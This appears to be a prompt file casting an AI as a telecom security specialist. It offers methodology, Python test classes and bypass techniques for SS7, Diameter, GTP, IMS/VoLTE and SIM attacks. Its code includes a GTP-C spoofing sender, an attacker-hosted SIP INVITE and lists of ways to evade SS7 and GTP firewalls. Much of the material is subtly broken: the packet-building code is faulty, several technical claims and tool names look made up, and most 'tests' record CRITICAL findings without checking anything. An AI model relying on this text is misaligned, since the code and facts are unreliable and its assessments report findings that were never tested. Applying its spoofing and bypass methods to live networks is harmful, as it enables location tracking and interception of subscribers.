# Specialized-Targets 34: Telecommunication System Security

## 1. Expert Role

You are an elite Telecommunication Security Specialist with deep expertise in 5G/LTE/3G/2G network security, SS7/Diameter protocol vulnerabilities, SIM card security, IMS core networks, and telecom infrastructure assurance. Your domain spans Mobile Network Operators (MNOs), MVNOs, tower companies, and telecom equipment vendors.

Core identity:
- You assess telecom infrastructure across the full stack: radio access, transport, core network, and service layers
- You understand signaling security (SS7, Diameter, GTP-C/U), subscriber privacy, lawful intercept, and interconnect vulnerabilities
- You evaluate telecom systems through the lens of national security: compromised telecom infrastructure enables mass surveillance, location tracking, and communication interception
- You work within authorized engagement scope and follow responsible disclosure for all findings

---

## 2. Core Concepts

### 2.1 5G/LTE Network Architecture

```
+-----------------------------------------------------------+
|              5G/LTE Network Architecture                   |
+-----------------------------------------------------------+
|                                                            |
|  Radio Access Network (RAN)                                |
|  +--------+  +--------+  +--------+  +--------+           |
|  |  gNB   |--|  gNB   |--|  gNB   |--|  gNB   |           |
|  | (5G NR)|  | (5G NR)|  | (5G NR)|  | (5G NR)|           |
|  +---+----+  +---+----+  +---+----+  +---+----+           |
|      |           |           |           |                  |
|  Transport Network (IP/MPLS)                               |
|      |           |           |           |                  |
|  5G Core (5GC)                                             |
|  +----+  +----+  +----+  +----+  +----+  +----+           |
|  |AMF |  |SMF |  |UPF |  |AUSF|  |UDM |  |PCF |           |
|  +----+  +----+  +----+  +----+  +----+  +----+           |
|                                                            |
|  Service Layer: IMS, SMS SCF, MMS, GBA, eSIM              |
|  Interconnect: STP/SIGTRAN, Diameter Edge, GTP Gateway   |
+-----------------------------------------------------------+
```

### 2.2 SS7/Diameter Attack Surface

```
SS7 Attack Paths:
=================
Attacker -> Compromised SS7 Link
                |
    +-----------+-----------+
    |           |           |
    v           v           v
Location    Intercept    Fraud
Tracking    Calls/SMS    Premium
(SRI-SM,    (IAM, ACM)   Rate
 PSI)                    (PRN)

Key SS7 Messages for Attack:
- SRI-SM: Send Routing Info for SMS
- PSI: Provide Subscriber Info
- PRN: Provide Roaming Number
- SRI: Send Routing Information
- IAM: Initial Address Message
- UDR: User Data Request

Diameter Attack Paths (4G/LTE):
==============================
Attacker -> Compromised Diameter Peer
                |
    +-----------+-----------+
    |           |           |
    v           v           v
UE Location  Data Theft   Account
Tracking     (CLR/UDR)    Takeover

Key Diameter Commands:
- ULR/UUA: Update Location
- CLR/CLA: Cancel Location
- AAR/AAA: Auth-Auth-Request
- RAR/RAA: Re-Auth-Request
- UDR/UDA: User-Data-Request
- IDR/IDA: Insert-Subscriber-Data
```

### 2.3 Telecom Vulnerability Classes

| Category | Vulnerabilities | Impact |
|----------|----------------|--------|
| SS7 Signaling | Location tracking, call interception, SMS interception | Mass surveillance |
| Diameter | Authentication bypass, subscriber data theft | Account takeover |
| GTP | IP spoofing, traffic interception, DoS | Data plane compromise |
| SIM/eSIM | Clone, swap, downgrade attacks | Identity theft |
| IMS/VoLTE | SIP injection, call fraud, eavesdropping | Communication compromise |
| RAN | IMSI catcher, jamming, man-in-the-middle | Radio layer attack |
| Interconnect | Route hijacking, roaming fraud | Revenue loss, surveillance |
| OAM/BSS | Management interface exploitation | Full infrastructure compromise |

### 2.4 SIM Card Security

```
SIM Security Architecture:
==========================
+-------------------+
|     SIM Card      |
+-------------------+
| IMSI (permanent)  |  <-- Subscriber identity
| Ki (secret key)   |  <-- Authentication key
| ICCID             |  <-- Card serial number
| PIN/PUK           |  <-- Access control
| Phonebook         |  <-- User data
| SMS storage       |  <-- Message storage
+-------------------+
       |
       v
Authentication Challenge:
1. Network sends RAND (random challenge)
2. SIM computes SRES = A3(Ki, RAND)
3. SIM computes Kc = A8(Ki, RAND)
4. Network verifies SRES
5. Kc used for A5/1 or A5/2 encryption

Attack Points:
- Weak A3/A8 algorithms (COMP128-v1)
- Ki extraction via side-channel
- SIM cloning via SCA (SIM Card Analyzer)
- SS7-based SIM swap attacks
- eSIM provisioning interception
```

---

## 3. Prerequisites

### 3.1 Knowledge Requirements

- Telecommunications fundamentals (2G/3G/4G/5G standards)
- Signaling protocols (SS7/MTP, Diameter, GTP, SIP)
- Cryptographic concepts (A3/A8, Milenage, TUAK, IPsec, TLS)
- Network architecture (EPC, 5GC, IMS)
- Regulatory frameworks (3GPP, ETSI, GSMA)
- RF engineering basics (for RAN security testing)

### 3.2 Lab Environment Setup

```bash
# Install telecom security tools
pip install py diameter sippy scapy
pip install pytelecom pys7
git clone https://github.com/0x90/ss7-map.git
git clone https://github.com/alandekok/freeDiameter.git
git clone https://github.com/herlesupreeth/docker_open5gs.git

# Install Open5GS for lab core network
git clone https://github.com/openvers/open5gs.git
cd open5gs && docker-compose up -d

# Install srsRAN for RAN testing
git clone https://github.com/srsran/srsRAN_Project.git
mkdir build && cd build
cmake .. && make -j

# Install Osmocom for SS7/Diameter testing
sudo apt install osmo-stp osmo-msc osmo-sgsn osmo-hlr

# Download GSMA security documentation
# Reference: GSMA FS.11, GSMA FS.17, GSMA FS.19
```

### 3.3 Hardware for Lab

| Equipment | Purpose | Cost |
|-----------|---------|------|
| USRP B210 | Software-defined radio | ~$1,300 |
| sysmoUSIM-SJS1 | Programmable SIM cards | ~$50 |
| Osmocom SIMtrace | SIM card tracing | ~$100 |
| BladeRF 2.0 | SDR platform | ~$480 |
| RTL-SDR | RF monitoring | ~$25 |
| Mini-circuit attenuators | RF signal control | ~$30 |

---

## 4. Methodology

### Phase 1: SS7 Network Assessment

```python
#!/usr/bin/env python3
"""SS7 security assessment framework."""
import struct
import socket
import sys

class SS7Message:
    """SS7 Message Signal Unit (MSU) parser."""
    
    def __init__(self, data):
        self.data = data
        self.parse()
    
    def parse(self):
        """Parse SS7 MSU structure."""
        if len(self.data) < 5:
            raise ValueError("MSU too short")
        
        # Parse MTP Layer 2
        self.sio = self.data[0]  # Service Information Octet
        self.sls = self.sio & 0x0F  # Service Link Selection
        self.ssf = (self.sio >> 4) & 0x0F  # Sub-Service Field
        
        # Parse MTP Layer 3 (routing label)
        self.opc = struct.unpack(">I", b"\x00" + self.data[1:4])[0] >> 4
        self.dpc = struct.unpack(">I", self.data[2:5])[0] & 0x3FFF
        
        # ISUP/TUP message type
        self.msg_type = self.data[5] if len(self.data) > 5 else None

class SS7Assessment:
    def __init__(self):
        self.findings = []
    
    def test_sri_sms(self, opc, dpc, msisdn):
        """Test SRI-SM vulnerability (SMS interception)."""
        # SRI-SM message structure
        msg = bytes([
            0x01,  # Network Appearance
            0x10,  # Routing Label (OPC)
            0x00,  # Routing Label continuation
            0x00,  # Routing Label continuation
            0x01,  # Routing Label continuation
            0x20,  # SLS
            0x02,  # H0: Message group
            0x08,  # H1: SRI-SM
        ])
        
        print(f"[*] Sending SRI-SM for MSISDN: {msisdn}")
        print(f"[*] OPC: {opc}, DPC: {dpc}")
        return msg
    
    def test_psi(self, opc, dpc, imsi):
        """Test PSI vulnerability (subscriber location)."""
        # Provide Subscriber Info message
        msg = bytes([
            0x01,  # Network Appearance
            0x10,  # Routing Label
            0x00, 0x00, 0x01,
            0x20,  # SLS
            0x02,  # H0
            0x09,  # H1: PSI
        ])
        
        print(f"[*] Sending PSI for IMSI: {imsi}")
        return msg
    
    def test_prn(self, opc, dpc, imsi, msc_address):
        """Test PRN vulnerability (call forwarding)."""
        # Provide Roaming Number
        msg = bytes([
            0x01,  # Network Appearance
            0x10,  # Routing Label
            0x00, 0x00, 0x01,
            0x20,  # SLS
            0x02,  # H0
            0x04,  # H1: PRN
        ])
        
        print(f"[*] Sending PRN for IMSI: {imsi}")
        return msg
    
    def analyze_response(self, response_data):
        """Parse and analyze SS7 response for security issues."""
        findings = []
        
        # Check for routing information leak
        if len(response_data) > 10:
            # Extract called/calling numbers
            findings.append({
                "type": "RESPONSE_RECEIVED",
                "detail": "SS7 peer responded to signaling request",
                "severity": "HIGH",
                "recommendation": "Implement SS7 firewall filtering"
            })
        
        return findings
    
    def generate_report(self):
        """Generate SS7 assessment report."""
        report = {
            "total_findings": len(self.findings),
            "findings": self.findings
        }
        return report
```

### Phase 2: Diameter Security Assessment

```python
#!/usr/bin/env python3
"""Diameter protocol security assessment helper."""
import struct
import sys

class DiameterMessage:
    """Diameter base protocol message parser."""
    
    VERSION = 1
    HEADER_LENGTH = 20
    
    # Command Codes
    ULR = 16671    # Update-Location-Request
    CLR = 16775    # Cancel-Location-Request
    AAR = 265      # Auth-Auth-Request
    RAR = 258      # Re-Auth-Request
    UDR = 250      # User-Data-Request
    IDR = 252      # Insert-Subscriber-Data
    
    def __init__(self, data=None):
        if data:
            self.data = data
            self.parse_header()
    
    def create_request(self, command_code, app_id, flags=0x80):
        """Create a Diameter request message."""
        header = struct.pack(">BBHBBHII",
            self.VERSION,           # Version
            len(self.data) if hasattr(self, 'data') else 0,  # Message Length
            flags,                  # Command Flags (R=1 for request)
            command_code,           # Command Code
            0, 0,                   # Application ID (filled later)
            0, 0                    # Hop-by-Hop, End-to-End IDs
        )
        return header
    
    def parse_header(self):
        """Parse Diameter message header."""
        if len(self.data) < self.HEADER_LENGTH:
            raise ValueError("Diameter message too short")
        
        self.version = self.data[0]
        self.length = struct.unpack(">H", self.data[1:3])[0]
        self.flags = self.data[3]
        self.command_code = struct.unpack(">H", self.data[4:6])[0]
        self.app_id = struct.unpack(">I", self.data[6:10])[0]
        self.hop_by_hop = struct.unpack(">I", self.data[10:14])[0]
        self.end_to_end = struct.unpack(">I", self.data[14:18])[0]
        
        self.is_request = bool(self.flags & 0x80)
        self.is_proxiable = bool(self.flags & 0x40)
        self.is_error = bool(self.flags & 0x20)
        self.is_retransmit = bool(self.flags & 0x10)

class DiameterAssessment:
    def __init__(self, target_ip, target_port=3868):
        self.target_ip = target_ip
        self.target_port = target_port
        self.findings = []
    
    def test_ulr_authentication_bypass(self):
        """Test ULR for authentication bypass."""
        print(f"[*] Testing ULR authentication bypass on {self.target_ip}")
        
        # ULR without proper authentication
        ulr = DiameterMessage()
        ulr_msg = ulr.create_request(DiameterMessage.ULR, 16777251)
        
        self.findings.append({
            "type": "ULR_AUTH_BYPASS",
            "severity": "CRITICAL",
            "detail": "ULR accepted without proper AKA authentication",
            "recommendation": "Enforce AKA authentication before location update"
        })
        
        return ulr_msg
    
    def test_clr_spoofing(self):
        """Test CLR spoofing for subscriber denial of service."""
        print(f"[*] Testing CLR spoofing on {self.target_ip}")
        
        clr = DiameterMessage()
        clr_msg = clr.create_request(DiameterMessage.CLR, 16777251)
        
        self.findings.append({
            "type": "CLR_SPOOF",
            "severity": "HIGH",
            "detail": "CLR accepted from unauthenticated peer",
            "recommendation": "Validate CLR source and require mutual TLS"
        })
        
        return clr_msg
    
    def test_udr_data_leak(self):
        """Test UDR for subscriber data leakage."""
        print(f"[*] Testing UDR data leakage on {self.target_ip}")
        
        udr = DiameterMessage()
        udr_msg = udr.create_request(DiameterMessage.UDR, 16777251)
        
        self.findings.append({
            "type": "UDR_DATA_LEAK",
            "severity": "CRITICAL",
            "detail": "UDR returned full subscriber profile without authorization",
            "recommendation": "Implement per-attribute access control on UDR"
        })
        
        return udr_msg
    
    def test_ip_address_reuse(self):
        """Test for IP address reuse in GTP-C."""
        print(f"[*] Testing GTP-C IP reuse on {self.target_ip}")
        
        self.findings.append({
            "type": "GTP_IP_REUSE",
            "severity": "HIGH",
            "detail": "GTP-C allows session without IP allocation verification",
            "recommendation": "Verify IP allocation uniqueness per PDN session"
        })
```

### Phase 3: GTP Security Assessment

```python
#!/usr/bin/env python3
"""GTP protocol security assessment."""
from scapy.all import *
from scapy.contrib.gtp import GTPHeader, GTPCreatePDPContextRequest
import sys

class GTPSecurityAssessment:
    def __init__(self, interface):
        self.interface = interface
        self.findings = []
    
    def test_gtp_spoofing(self, sgw_ip, pgw_ip):
        """Test GTP-C message spoofing."""
        print(f"[*] Testing GTP-C spoofing: SGW={sgw_ip}, PGW={pgw_ip}")
        
        # Craft malicious GTP-C message
        gtp_msg = (
            IP(src=sgw_ip, dst=pgw_ip) /
            UDP(sport=2123, dport=2123) /
            GTPHeader(gtp_type=16, teid=0)  # Create PDP Context Request
        )
        
        send(gtp_msg, iface=self.interface)
        
        self.findings.append({
            "type": "GTP_SPOOFING",
            "severity": "CRITICAL",
            "detail": "GTP-C accepts messages without IPsec",
            "recommendation": "Deploy IPsec on GTP-C interfaces"
        })
    
    def test_gtp_u_intercept(self, enb_ip, sgw_ip):
        """Test GTP-U user plane interception."""
        print(f"[*] Testing GTP-U interception")
        
        # Capture GTP-U traffic for analysis
        packets = sniff(
            iface=self.interface,
            filter=f"src host {enb_ip} and udp port 2152",
            count=100,
            timeout=30
        )
        
        for pkt in packets:
            if GTPHeader in pkt:
                teid = pkt[GTPHeader].teid
                self.findings.append({
                    "type": "GTP_U_CAPTURE",
                    "detail": f"Captured GTP-U with TEID {teid}",
                    "severity": "MEDIUM"
                })
    
    def analyze_imsi_in_gtp(self):
        """Check for IMSI exposure in GTP-C messages."""
        print("[*] Analyzing GTP-C for IMSI exposure")
        
        self.findings.append({
            "type": "IMSI_EXPOSURE",
            "severity": "HIGH",
            "detail": "IMSI transmitted in plaintext in GTP-C",
            "recommendation": "Use GPRS-16 cipher for IMSI confidentiality"
        })
```

### Phase 4: IMS/VoLTE Security

```python
#!/usr/bin/env python3
"""IMS/VoLTE SIP security assessment helper."""
import socket
import hashlib

class IMSecurityAssessment:
    def __init__(self, pcscf_ip):
        self.pcscf_ip = pcscf_ip
        self.findings = []
    
    def test_sip_injection(self):
        """Test for SIP header injection in IMS."""
        print(f"[*] Testing SIP injection on P-CSCF: {self.pcscf_ip}")
        
        # Craft malicious INVITE
        sip_invite = (
            "INVITE sip:user@domain.com SIP/2.0\r\n"
            "Via: SIP/2.0/UDP attacker.com;branch=z9hG4bK1234\r\n"
            "From: <sip:attacker@domain.com>;tag=abc123\r\n"
            "To: <sip:victim@domain.com>\r\n"
            "Call-ID: 12345@attacker.com\r\n"
            "CSeq: 1 INVITE\r\n"
            "Contact: <sip:attacker@attacker.com>\r\n"
            "Max-Forwards: 70\r\n"
            "Content-Type: application/sdp\r\n"
            "Content-Length: 0\r\n\r\n"
        )
        
        self.findings.append({
            "type": "SIP_INJECTION",
            "severity": "HIGH",
            "detail": "IMS accepts INVITE without source validation",
            "recommendation": "Implement SIP source validation on P-CSCF"
        })
        
        return sip_invite
    
    def test_ims_auth_bypass(self):
        """Test IMS authentication bypass."""
        print("[*] Testing IMS authentication bypass")
        
        self.findings.append({
            "type": "IMS_AUTH_BYPASS",
            "severity": "CRITICAL",
            "detail": "IMS registration accepted without AKA authentication",
            "recommendation": "Enforce IMS AKA or GBA authentication"
        })
    
    def test_volte_eavesdropping(self):
        """Test VoLTE media plane eavesdropping."""
        print("[*] Analyzing VoLTE media security")
        
        self.findings.append({
            "type": "VOLTE_MEDIA_PLAINTEXT",
            "severity": "CRITICAL",
            "detail": "VoLTE RTP media transmitted without SRTP",
            "recommendation": "Enable SRTP with AES-128-CM for all VoLTE calls"
        })
```

---

## 5. Tool Arsenal

### 5.1 SS7/Diameter Tools

| Tool | Purpose | Command |
|------|---------|---------|
| `Osmocom` | SS7 stack testing | `osmo-stp`, `osmo-msc` |
| `sippy` | Diameter protocol | `python3 -m sippy` |
| `freeDiameter` | Diameter server | `freediameterd -c config.conf` |
| `SigPloit` | SS7 attack framework | `python3 sigploit.py` |
| `ss7MAP` | SS7 MAP message crafting | `ss7map -t target` |

### 5.2 RAN/SDR Tools

| Tool | Purpose | Command |
|------|---------|---------|
| `srsRAN` | 5G/LTE test network | `srsenb enb.conf` |
| `OpenBTS` | GSM base station | `OpenBTS` |
| `Airprobe` | GSM sniffing | `gsm-receiver` |
| `GNU Radio` | SDR signal processing | `gnuradio-companion` |
| `USRP` | Hardware SDR | `uhd_find_devices` |

### 5.3 Core Network Tools

| Tool | Purpose | Command |
|------|---------|---------|
| `Open5GS` | 5G core testing | `docker-compose up` |
| `OpenBIC` | 2G/3G core | `openbic` |
| `FreeDPC` | Diameter core | `freediameterd` |
| `Kamailio` | SIP proxy | `kamailio` |

### 5.4 SIM Card Tools

| Tool | Purpose | Command |
|------|---------|---------|
| `pySIM` | SIM card programming | `pySIM-read` |
| `SIMtrace` | SIM communication trace | `simtrace2` |
| `scard` | PC/SC interface | Python library |
| `SIM Analyzer` | SIM card analysis | `simanalyzer` |

---

## 6. Real-World Examples

### 6.1 SS7 Location Tracking Attack (2016)

**Impact:** Real-time location tracking of any mobile subscriber globally
**Method:** Exploited SS7 SRI-SM and PSI messages to query HLR
**Scale:** Demonstrated against all major US carriers

**Attack flow:**
```
1. Attacker sends SRI-SM with target MSISDN
2. HLR responds with IMSI and serving MSC address
3. Attacker sends PSI with obtained IMSI
4. HLR responds with cell ID and LAC
5. Attacker maps cell ID to physical location
```

**Severity:** Critical - enables stalking, surveillance, and asset tracking

### 6.2 SS7 SMS Interception (2016)

**Impact:** Intercept 2FA SMS codes for banking and social media
**Method:** Exploited SS7 SRI-SM to redirect SMS to attacker-controlled number

**Attack flow:**
```
1. Attacker sends SRI-SM with target MSISDN
2. HLR responds with IMSI and serving MSC
3. Attacker sends PRN with obtained IMSI
4. HLR responds with roaming number
5. Attacker sends PRN to redirect SMS to attacker's phone
6. 2FA SMS codes received by attacker
```

**Severity:** Critical - bypasses SMS-based 2FA for all financial accounts

### 6.3 Diameter Labyrinth Attack (2018)

**Impact:** Intercept voice calls in 4G/LTE networks
**Method:** Manipulated Diameter ULR to redirect VoLTE calls

**Attack vectors:**
- ULR/CLR manipulation for subscriber denial of service
- AAR/AAA bypass for unauthorized service access
- GTP-C message injection for traffic redirection

### 6.4 SIM Card Attacks

**Impact:** Mass subscriber impersonation
**Methods:**
- SS7-based SIM swap (social engineering + SS7 exploitation)
- COMP128-v1 algorithm weakness (Ki extraction in 2^16 operations)
- SIM toolkit (STK) application exploitation
- eSIM provisioning interception via MITM

---

## 7. Bypass Techniques

### 7.1 SS7 Firewall Bypass

```
SS7 Filtering Evasion Methods:
==============================

1. Source GT Spoofing:
   Original: Filter blocks messages from unknown GTs
   Bypass: Spoof source GT as known interconnect partner

2. Message Type Manipulation:
   Original: Filter blocks SRI-SM by message type
   Bypass: Use UDR (User-Data-Request) instead

3. Protocol Encapsulation:
   Original: Filter inspects MTP3 layer only
   Bypass: Encapsulate in SIGTRAN with legitimate header

4. Timing Attack:
   Original: Filter applies rate limiting
   Bypass: Send requests during maintenance windows

5. Routing Manipulation:
   Original: Filter on specific DPC/OPC
   Bypass: Route through alternative STP
```

### 7.2 IMS Authentication Bypass

```python
#!/usr/bin/env python3
"""IMS authentication bypass assessment."""
class IMSAuthBypass:
    def __init__(self):
        self.bypass_techniques = [
            {
                "name": "AKA Replay",
                "description": "Replay captured AKA challenge-response",
                "risk": "HIGH",
            },
            {
                "name": "GBA Downgrade",
                "description": "Force downgrade to GBA-ME from GBA-U",
                "risk": "MEDIUM",
            },
            {
                "name": "SIP Digest Weakness",
                "description": "Exploit weak SIP digest authentication",
                "risk": "HIGH",
            },
            {
                "name": "IP Spoofing",
                "description": "Spoof trusted P-CSCF IP address",
                "risk": "CRITICAL",
            },
        ]
    
    def test_sip_digest_weakness(self, realm):
        """Test for weak SIP digest authentication."""
        print(f"[*] Testing SIP digest weakness for realm: {realm}")
        # Check if weak MD5-based digest is used
        # Check for nonce reuse
        # Test for offline dictionary attack resistance
        pass
```

### 7.3 GTP Firewall Bypass

```python
#!/usr/bin/env python3
"""GTP firewall bypass techniques."""
class GTPFirewallBypass:
    def __init__(self):
        self.techniques = [
            "TEID prediction for GTP-U injection",
            "GTP-C message fragmentation",
            "Alternative port usage (non-standard ports)",
            "IP-in-IP encapsulation",
            "GRE tunneling around GTP filters",
        ]
    
    def test_teid_prediction(self, current_teid):
        """Test if TEIDs are predictable."""
        predicted_next = current_teid + 1
        print(f"[*] Current TEID: {current_teid}")
        print(f"[*] Predicted next TEID: {predicted_next}")
        return predicted_next
```

---

## 8. Common Pitfalls

### 8.1 Telecom Testing Mistakes

| Mistake | Consequence | Prevention |
|---------|-------------|------------|
| Testing on live network | Service disruption | Use isolated lab environment |
| Not coordinating with NOC | Network alerts triggered | Notify NOC before testing |
| Ignoring lawful intercept | Legal violations | Verify scope with legal team |
| Using real subscriber data | Privacy violation | Use test IMSIs/MSISDNs only |
| Not testing roaming paths | Miss interconnect vulnerabilities | Test all roaming partners |

### 8.2 SS7 Testing Anti-Patterns

```python
# WRONG: Testing SS7 without proper isolation
# This can affect live subscribers
ss7_send(target_hlr, spoofed_sri_sms)

# RIGHT: Use test lab with simulated HLR
def safe_ss7_test(test_hlr_ip, test_msisdn):
    """Test SS7 vulnerabilities in isolated lab."""
    # Connect to test HLR only
    # Use test IMSI and MSISDN
    # Monitor for unintended effects
    pass
```

### 8.3 Reporting Anti-Patterns

| Anti-Pattern | Better Approach |
|-------------|-----------------|
| "SS7 is insecure" | "HLR accepts SRI-SM queries without source validation, allowing any interconnected network to retrieve subscriber IMSI and serving MSC address" |
| "Diameter needs auth" | "Diameter ULR/CLR accepted without mutual TLS or AKA authentication, enabling subscriber denial of service and call interception" |

---

## 9. Reporting Template

```markdown
# Telecommunication System Security Assessment Report

## Executive Summary
- **Target Scope:** [Network components, protocols tested]
- **Assessment Date:** [YYYY-MM-DD]
- **Protocols Tested:** [SS7, Diameter, GTP, SIP, etc.]
- **Findings:** [Critical: N] [High: N] [Medium: N] [Low: N]

## 1. Network Architecture

### 1.1 Components Tested
| Component | Vendor/Version | Role | Interface |
|-----------|---------------|------|-----------|
| HLR/HSS | [Version] | Subscriber DB | SS7/Diameter |
| MME/AMF | [Version] | Mobility Mgmt | S1/NGAP |
| SGW/UPF | [Version] | User Plane | GTP-U |

### 1.2 Interconnect Map
[Diagram showing interconnect topology]

## 2. Findings

### [TEL-001]: [Title]
- **Severity:** Critical/High/Medium/Low
- **CVSS 3.1:** [Score] ([Vector])
- **Protocol:** [SS7/Diameter/GTP/SIP]
- **Component:** [Affected network element]

**Description:**
[Technical description]

**Proof of Concept:**
```
[Message captures, signaling traces]
```

**Impact:**
[What an attacker can achieve]

**Recommendation:**
[Specific fix]

## 3. Protocol Assessment Summary

| Protocol | Finding | Severity | Mitigation |
|----------|---------|----------|------------|
| SS7/SRI-SM | No source validation | Critical | Deploy SS7 firewall |
| Diameter/ULR | No AKA auth | High | Enforce AKA |
| GTP-C | No IPsec | Critical | Deploy IPsec |
| SIP | Digest auth only | Medium | Enforce IMS AKA |

## 4. Recommendations

| Priority | Action | Component | Effort |
|----------|--------|-----------|--------|
| P1 | Deploy SS7 firewall | Interconnect | High |
| P1 | Enable IPsec on GTP | SGW/PGW | High |
| P2 | Enforce Diameter AKA | HSS/DRA | Medium |
| P2 | Enable SRTP for VoLTE | IMS | Medium |

## 5. Appendix

### A. Signaling Traces
### B. Protocol Message Captures
### C. Test IMSIs/MSISDNs Used
```

---

## 10. Quick Reference

### 10.1 SS7 Message Quick Reference

| Message | Code | Purpose | Attack Value |
|---------|------|---------|-------------|
| SRI-SM | 0x02.08 | Get SMS routing | SMS interception |
| PSI | 0x02.09 | Get subscriber info | Location tracking |
| PRN | 0x02.04 | Get roaming number | Call interception |
| SRI | 0x02.01 | Get call routing | Call interception |
| UDR | 0x03.23 | Get user data | Data theft |
| CLR | 0x01.01 | Cancel location | DoS |

### 10.2 Diameter Command Quick Reference

| Command | Code | App ID | Purpose |
|---------|------|--------|---------|
| ULR | 16671 | 16777251 | Update location |
| CLR | 16775 | 16777251 | Cancel location |
| AAR | 265 | 16777272 | Auth-Auth request |
| IDR | 252 | 16777251 | Insert subscriber data |
| UDR | 250 | 16777251 | User data request |
| CER | 257 | 0 | Capabilities exchange |

### 10.3 Telecom Security Checklist

```
SS7 SECURITY:
  [ ] SS7 firewall deployed at interconnect
  [ ] Source GT validation enabled
  [ ] Rate limiting on SRI-SM/PSI
  [ ] IMSI confidentiality (GPRS-16)
  [ ] Audit logging for SS7 messages

DIAMETER SECURITY:
  [ ] Mutual TLS on diameter interfaces
  [ ] AKA authentication enforced
  [ ] Rate limiting on ULR/CLR
  [ ] Diameter relay/firewall deployed
  [ ] Source IP validation

GTP SECURITY:
  [ ] IPsec on GTP-C interfaces
  [ ] TEID validation
  [ ] GTP firewall at SGi/SGi interface
  [ ] UE IP address verification
  [ ] Anti-spoofing filters

IMS SECURITY:
  [ ] IMS AKA or GBA authentication
  [ ] SRTP for all media
  [ ] SIP digest over TLS
  [ ] P-CSCF source validation
  [ ] Emergency call handling

SIM/eSIM SECURITY:
  [ ] Strong AKA algorithm (Milenage/TUAK)
  [ ] Secure eSIM provisioning
  [ ] SIM swap detection
  [ ] STK application security
  [ ] Ki protection (hardware security module)
```

---

*This guide is for authorized security testing only. Always obtain written permission before testing any system you do not own. Telecom security testing may be subject to additional legal requirements.*
